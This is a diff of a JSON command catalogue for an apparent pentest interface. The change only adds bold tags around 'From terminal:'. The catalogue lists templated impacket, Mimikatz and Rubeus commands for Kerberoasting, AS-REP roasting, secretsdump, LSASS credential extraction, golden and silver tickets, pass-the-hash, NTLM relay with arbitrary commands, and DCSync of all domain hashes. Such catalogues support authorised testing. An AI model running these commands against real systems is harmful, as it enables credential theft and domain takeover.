@@ -9,7 +9,7 @@
                         "display": "With password:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD>",
+                                "command": "<b>From terminal:</b> impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD>",
                                 "requirements": [
                                     {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
@@ -27,7 +27,7 @@
                         "display": "With password (saving hashes to output file):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <OUTPUT_FILE>",
+                                "command": "<b>From terminal:</b> impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <OUTPUT_FILE>",
                                 "requirements": [
                                     {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
@@ -46,7 +46,7 @@
                         "display": "With hash:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-GetUserSPNs -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME>",
+                                "command": "<b>From terminal:</b> impacket-GetUserSPNs -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME>",
                                 "requirements": [
                                     {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
@@ -64,7 +64,7 @@
                         "display": "With hash (saving hashes to output file):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-GetUserSPNs -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME> -outputfile <OUTPUT_FILE>",
+                                "command": "<b>From terminal:</b> impacket-GetUserSPNs -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME> -outputfile <OUTPUT_FILE>",
                                 "requirements": [
                                     {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
@@ -88,7 +88,7 @@
                         "display": "With password:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-GetNPUsers -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -format hashcat",
+                                "command": "<b>From terminal:</b> impacket-GetNPUsers -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -format hashcat",
                                 "requirements": [
                                     {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
@@ -106,7 +106,7 @@
                         "display": "With password (saving hashes to output file):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-GetNPUsers -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -format hashcat -outputfile <OUTPUT_FILE>",
+                                "command": "<b>From terminal:</b> impacket-GetNPUsers -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -format hashcat -outputfile <OUTPUT_FILE>",
                                 "requirements": [
                                     {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
@@ -125,7 +125,7 @@
                         "display": "With hash:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-GetNPUsers -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME> -format hashcat",
+                                "command": "<b>From terminal:</b> impacket-GetNPUsers -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME> -format hashcat",
                                 "requirements": [
                                     {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
@@ -143,7 +143,7 @@
                         "display": "With hash (saving hashes to output file):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-GetNPUsers -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME> -format hashcat -outputfile <OUTPUT_FILE>",
+                                "command": "<b>From terminal:</b> impacket-GetNPUsers -request -dc-ip <DC_IP> -hashes :<NTLM> <DOMAIN>/<USERNAME> -format hashcat -outputfile <OUTPUT_FILE>",
                                 "requirements": [
                                     {"DC_IP": {"display": "Domain Controller IP", "type": "text"}},
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
@@ -167,7 +167,7 @@
                         "display": "With password:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -dc-ip <DC_IP> -history",
+                                "command": "<b>From terminal:</b> impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -dc-ip <DC_IP> -history",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -186,7 +186,7 @@
                         "display": "With password (saving hashes to output file):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -dc-ip <DC_IP> -history -outputfile <OUTPUT_FILE>",
+                                "command": "<b>From terminal:</b> impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -dc-ip <DC_IP> -history -outputfile <OUTPUT_FILE>",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -206,7 +206,7 @@
                         "display": "With hash:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-secretsdump <DOMAIN>/<USERNAME>@<TARGET_IP> -dc-ip <DC_IP> -history -hashes :<NTLM>",
+                                "command": "<b>From terminal:</b> impacket-secretsdump <DOMAIN>/<USERNAME>@<TARGET_IP> -dc-ip <DC_IP> -history -hashes :<NTLM>",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -225,7 +225,7 @@
                         "display": "With hash (saving hashes to output file):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-secretsdump <DOMAIN>/<USERNAME>@<TARGET_IP> -dc-ip <DC_IP> -history -hashes :<NTLM> -outputfile <OUTPUT_FILE>",
+                                "command": "<b>From terminal:</b> impacket-secretsdump <DOMAIN>/<USERNAME>@<TARGET_IP> -dc-ip <DC_IP> -history -hashes :<NTLM> -outputfile <OUTPUT_FILE>",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -250,7 +250,7 @@
                         "display": "Silver tickets generation",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-ticketer -nthash <NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SPN> <USERNAME>",
+                                "command": "<b>From terminal:</b> impacket-ticketer -nthash <NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SPN> <USERNAME>",
                                 "requirements": [
                                     {"NTHASH": {"display": "Signing hash (service)", "type": "text"}},
                                     {"DOMAIN_SID": {"display": "Domain SID", "type": "text"}},
@@ -260,7 +260,7 @@
                                 ]
                             },
                             {
-                                "command": "From terminal: export KRB5CCNAME=/root/impacket-examples/<USERNAME>.ccache",
+                                "command": "<b>From terminal:</b> export KRB5CCNAME=/root/impacket-examples/<USERNAME>.ccache",
                                 "requirements": [
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}}
                                 ]
@@ -280,7 +280,7 @@
                         "display": "Golden ticket generation",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-ticketer -nthash <NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>",
+                                "command": "<b>From terminal:</b> impacket-ticketer -nthash <NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>",
                                 "requirements": [
                                     {"NTHASH": {"display": "Signing hash (KDC/krbtgt)", "type": "text"}},
                                     {"DOMAIN_SID": {"display": "Domain SID", "type": "text"}},
@@ -289,7 +289,7 @@
                                 ]
                             },
                             {
-                                "command": "From terminal: export KRB5CCNAME=/root/impacket-examples/<USERNAME>.ccache",
+                                "command": "<b>From terminal:</b> export KRB5CCNAME=/root/impacket-examples/<USERNAME>.ccache",
                                 "requirements": [
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}}
                                 ]
@@ -309,7 +309,7 @@
                         "display": "Convert ticket from Windows to UNIX format",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-ticketConverter <KIRBI_TICKET> <CCACHE_TICKET>",
+                                "command": "<b>From terminal:</b> impacket-ticketConverter <KIRBI_TICKET> <CCACHE_TICKET>",
                                 "requirements": [
                                     {"KIRBI_TICKET": {"display": "Kirbi ticket name", "type": "text"}},
                                     {"CCACHE_TICKET": {"display": "CCache ticket name", "type": "text"}}
@@ -321,7 +321,7 @@
                         "display": "Convert ticket from UNIX to Windows format",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-ticketConverter <CCACHE_TICKET> <KIRBI_TICKET>",
+                                "command": "<b>From terminal:</b> impacket-ticketConverter <CCACHE_TICKET> <KIRBI_TICKET>",
                                 "requirements": [
                                     {"CCACHE_TICKET": {"display": "CCache ticket name", "type": "text"}},
                                     {"KIRBI_TICKET": {"display": "Kirbi ticket name", "type": "text"}}
@@ -338,7 +338,7 @@
                         "display": "With password:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
+                                "command": "<b>From terminal:</b> impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -352,7 +352,7 @@
                         "display": "With hash:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
+                                "command": "<b>From terminal:</b> impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -371,7 +371,7 @@
                         "display": "With password:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-smbexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
+                                "command": "<b>From terminal:</b> impacket-smbexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -385,7 +385,7 @@
                         "display": "With hash:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-smbexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
+                                "command": "<b>From terminal:</b> impacket-smbexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -404,7 +404,7 @@
                         "display": "With password:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
+                                "command": "<b>From terminal:</b> impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -418,7 +418,7 @@
                         "display": "With hash:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-wmiexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
+                                "command": "<b>From terminal:</b> impacket-wmiexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -437,7 +437,7 @@
                         "display": "Pivoting with NTLMRelay",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-ntlmrelayx -t <TARGET_IP> -c '<COMMAND>'",
+                                "command": "<b>From terminal:</b> impacket-ntlmrelayx -t <TARGET_IP> -c '<COMMAND>'",
                                 "requirements": [
                                     {"TARGET_IP": {"display": "Target IP", "type": "text"}},
                                     {"COMMAND": {"display": "Command", "type": "text"}}
@@ -454,7 +454,7 @@
                         "display": "With password:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
+                                "command": "<b>From terminal:</b> impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -468,7 +468,7 @@
                         "display": "With hash:",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-mssqlclient <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
+                                "command": "<b>From terminal:</b> impacket-mssqlclient <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM>",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
@@ -487,7 +487,7 @@
                         "display": "List shares (NULL user):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-smbclient --no-pass -L //<TARGET_IP>",
+                                "command": "<b>From terminal:</b> impacket-smbclient --no-pass -L //<TARGET_IP>",
                                 "requirements": [
                                     {"TARGET_IP": {"display": "Target IP", "type": "text"}}
                                 ]
@@ -498,7 +498,7 @@
                         "display": "List shares (with password):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-smbclient -U '<USERNAME>%<PASSWORD>' -L //<TARGET_IP>",
+                                "command": "<b>From terminal:</b> impacket-smbclient -U '<USERNAME>%<PASSWORD>' -L //<TARGET_IP>",
                                 "requirements": [
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
                                     {"PASSWORD": {"display": "Password", "type": "server"}},
@@ -511,7 +511,7 @@
                         "display": "List shares (with hash):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-smbclient -U '<USERNAME>%<NTLM>' --pw-nt-hash -L //<TARGET_IP>",
+                                "command": "<b>From terminal:</b> impacket-smbclient -U '<USERNAME>%<NTLM>' --pw-nt-hash -L //<TARGET_IP>",
                                 "requirements": [
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
                                     {"NTLM": {"display": "NTLM Hash", "type": "server"}},
@@ -524,7 +524,7 @@
                         "display": "Connect to share (NULL user):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-smbclient -N //<TARGET_IP>/<SHARE>",
+                                "command": "<b>From terminal:</b> impacket-smbclient -N //<TARGET_IP>/<SHARE>",
                                 "requirements": [
                                     {"TARGET_IP": {"display": "Target IP", "type": "text"}},
                                     {"SHARE": {"display": "Share", "type": "text"}}
@@ -536,7 +536,7 @@
                         "display": "Connect to share (with password):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-smbclient -U '<USERNAME>%<PASSWORD>' //<TARGET_IP>/<SHARE>",
+                                "command": "<b>From terminal:</b> impacket-smbclient -U '<USERNAME>%<PASSWORD>' //<TARGET_IP>/<SHARE>",
                                 "requirements": [
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
                                     {"PASSWORD": {"display": "Password", "type": "server"}},
@@ -550,7 +550,7 @@
                         "display": "Connect to share (with hash):",
                         "commands": [
                             {
-                                "command": "From terminal: impacket-smbclient -U '<USERNAME>%<NTLM>' --pw-nt-hash //<TARGET_IP>/<SHARE>",
+                                "command": "<b>From terminal:</b> impacket-smbclient -U '<USERNAME>%<NTLM>' --pw-nt-hash //<TARGET_IP>/<SHARE>",
                                 "requirements": [
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
                                     {"NTLM": {"display": "NTLM Hash", "type": "server"}},
@@ -574,7 +574,7 @@
                         "display": "Extract from victim's OS",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
                                 "requirements": []
                             }
                         ]
@@ -583,7 +583,7 @@
                         "display": "Extract from victim's OS (saving output to file):",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > <OUTPUT>",
+                                "command": "<b>From terminal:</b> mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > <OUTPUT>",
                                 "requirements": [
                                     {"OUTPUT": {"display": "Output file", "type": "text"}}
                                 ]
@@ -598,7 +598,7 @@
                                 "requirements": []
                             },
                             {
-                                "command": "From terminal: mimikatz.exe sekurlsa::minidump <DUMP> sekurlsa::logonpasswords exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe sekurlsa::minidump <DUMP> sekurlsa::logonpasswords exit",
                                 "requirements": [
                                     {"DUMP": {"display": "Dump file", "type": "text"}}
                                 ]
@@ -613,7 +613,7 @@
                                 "requirements": []
                             },
                             {
-                                "command": "From terminal: mimikatz.exe sekurlsa::minidump <DUMP> sekurlsa::logonpasswords exit > <OUTPUT>",
+                                "command": "<b>From terminal:</b> mimikatz.exe sekurlsa::minidump <DUMP> sekurlsa::logonpasswords exit > <OUTPUT>",
                                 "requirements": [
                                     {"DUMP": {"display": "Dump file", "type": "text"}},
                                     {"OUTPUT": {"display": "Output file", "type": "text"}}
@@ -630,7 +630,7 @@
                         "display": "TSPKG Credentials:",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe sekurlsa::tspkg log full exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe sekurlsa::tspkg log full exit",
                                 "requirements": []
                             }
                         ]
@@ -639,7 +639,7 @@
                         "display": "TSPKG Credentials (saving output to file):",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe sekurlsa::tspkg log full exit > <OUTPUT>",
+                                "command": "<b>From terminal:</b> mimikatz.exe sekurlsa::tspkg log full exit > <OUTPUT>",
                                 "requirements": [
                                     {"OUTPUT": {"display": "Output file", "type": "text"}}
                                 ]
@@ -654,7 +654,7 @@
                                 "requirements": []
                             },
                             {
-                                "command": "From terminal: mimikatz.exe sekurlsa::wdigest <DUMP> exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe sekurlsa::wdigest <DUMP> exit",
                                 "requirements": [
                                     {"DUMP": {"display": "Dump file", "type": "text"}}
                                 ]
@@ -669,7 +669,7 @@
                                 "requirements": []
                             },
                             {
-                                "command": "From terminal: mimikatz.exe sekurlsa::wdigest <DUMP> exit > <OUTPUT>",
+                                "command": "<b>From terminal:</b> mimikatz.exe sekurlsa::wdigest <DUMP> exit > <OUTPUT>",
                                 "requirements": [
                                     {"DUMP": {"display": "Dump file", "type": "text"}},
                                     {"OUTPUT": {"display": "Output file", "type": "text"}}
@@ -686,7 +686,7 @@
                         "display": "Silver tickets generation",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe 'kerberos::golden /domain:<DOMAIN> /sid:<SID> /rc4:<NTHASH> /user:<USERNAME> /service:<SERVICE_NAME> /target:<TARGET>' exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe 'kerberos::golden /domain:<DOMAIN> /sid:<SID> /rc4:<NTHASH> /user:<USERNAME> /service:<SERVICE_NAME> /target:<TARGET>' exit",
                                 "requirements": [
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
                                     {"SID": {"display": "Domain SID", "type": "text"}},
@@ -697,7 +697,7 @@
                                 ]
                             },
                             {
-                                "command": "From terminal: mimikatz.exe 'kerberos::ptt ticket.kirbi' exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe 'kerberos::ptt ticket.kirbi' exit",
                                 "requirements": []
                             },
                             {
@@ -715,7 +715,7 @@
                         "display": "Golden ticket generation",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe 'kerberos::golden /user:<USERNAME> /domain:<TARGET> /sid:<SID> krbtgt:<NTHASH> /ptt' exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe 'kerberos::golden /user:<USERNAME> /domain:<TARGET> /sid:<SID> krbtgt:<NTHASH> /ptt' exit",
                                 "requirements": [
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
                                     {"TARGET": {"display": "Target domain name", "type": "text"}},
@@ -738,7 +738,7 @@
                         "display": "Pass the hash",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe 'sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM>' exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe 'sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM>' exit",
                                 "requirements": [
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
@@ -756,7 +756,7 @@
                         "display": "Pass the ticket",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe 'kerberos::ptt <TICKET>' exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe 'kerberos::ptt <TICKET>' exit",
                                 "requirements": [
                                     {"TICKET": {"display": "Ticket file", "type": "text"}}
                                 ]
@@ -772,7 +772,7 @@
                         "display": "Token gathering",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe token::whoami exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe token::whoami exit",
                                 "requirements": []
                             }
                         ]
@@ -781,7 +781,7 @@
                         "display": "Privilege escalation with the previous token",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe 'token::elevation /token:<TOKEN>' exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe 'token::elevation /token:<TOKEN>' exit",
                                 "requirements": [
                                     {"TOKEN": {"display": "Token gathered from the token gathering command (click generate with blank token)", "type": "text"}}
                                 ]
@@ -797,7 +797,7 @@
                         "display": "Retrieve single user:",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe 'lsadump::dcsync /dc:<DC> /domain:<DOMAIN> /user:<USER>' exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe 'lsadump::dcsync /dc:<DC> /domain:<DOMAIN> /user:<USER>' exit",
                                 "requirements": [
                                     {"DC": {"display": "Domain controller", "type": "text"}},
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}},
@@ -810,7 +810,7 @@
                         "display": "Retrieve all:",
                         "commands": [
                             {
-                                "command": "From terminal: mimikatz.exe 'lsadump::dcsync /dc:<DC> /domain:<DOMAIN> /all /csv' exit",
+                                "command": "<b>From terminal:</b> mimikatz.exe 'lsadump::dcsync /dc:<DC> /domain:<DOMAIN> /all /csv' exit",
                                 "requirements": [
                                     {"DC": {"display": "Domain controller", "type": "text"}},
                                     {"DOMAIN": {"display": "Domain (FQDN)", "type": "select"}}
@@ -832,7 +832,7 @@
                         "display": "Pass the hash",
                         "commands": [
                             {
-                                "command": "From terminal: .\\Rubeus.exe pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM>",
+                                "command": "<b>From terminal:</b> .\\Rubeus.exe pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM>",
                                 "requirements": [
                                     {"USERNAME": {"display": "Username", "type": "autocomplete"}},
                                     {"DOMAIN": {"display": "Domain", "type": "select"}},
@@ -850,7 +850,7 @@
                         "display": "Pass the ticket",
                         "commands": [
                             {
-                                "command": "From terminal: .\\Rubeus.exe ptt /ticket:<TICKET>",
+                                "command": "<b>From terminal:</b> .\\Rubeus.exe ptt /ticket:<TICKET>",
                                 "requirements": [
                                     {"TICKET": {"display": "Ticket file", "type": "text"}}
                                 ]
@@ -866,7 +866,7 @@
                         "display": "Kerberoasting",
                         "commands": [
                             {
-                                "command": "From terminal: .\\Rubeus.exe kerberoast /outfile:<OUTPUT>",
+                                "command": "<b>From terminal:</b> .\\Rubeus.exe kerberoast /outfile:<OUTPUT>",
                                 "requirements": [
                                     {"OUTPUT": {"display": "Output file", "type": "text"}}
                                 ]
@@ -886,7 +886,7 @@
                         "display": "AS-REP Roasting",
                         "commands": [
                             {
-                                "command": "From terminal: .\\Rubeus.exe asreproast /format:hashcat /outfile:<OUTPUT>",
+                                "command": "<b>From terminal:</b> .\\Rubeus.exe asreproast /format:hashcat /outfile:<OUTPUT>",
                                 "requirements": [
                                     {"OUTPUT": {"display": "Output file", "type": "text"}}
                                 ]
